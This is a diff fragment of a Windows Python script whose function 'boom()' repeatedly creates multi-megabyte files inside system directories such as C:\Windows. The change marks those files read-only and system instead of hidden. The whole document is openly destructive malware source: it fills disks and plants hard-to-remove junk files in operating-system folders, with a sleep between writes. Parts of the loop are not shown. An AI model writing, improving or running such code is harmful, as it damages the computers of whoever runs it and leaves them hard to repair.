@@ -4,8 +4,6 @@ from time import sleep
 import win32con, win32api
 
 
-
-
 def boom():
     directory = ['C:\Program Files (x86)\Internet Explorer\zh-CN',
                  'C:\Windows',
@@ -17,7 +15,8 @@ def boom():
             with open(join(dir, name), 'w') as file:
                 file.seek(1024 * 1024 * 1 * 4)
                 file.write(name)
-                win32api.SetFileAttributes(join(dir, name), win32con.FILE_ATTRIBUTE_HIDDEN)
+                win32api.SetFileAttributes(join(dir, name), win32con.FILE_ATTRIBUTE_READONLY)
+                win32api.SetFileAttributes(join(dir, name), win32con.FILE_ATTRIBUTE_SYSTEM)
                 sleep(3)
         except:
             break
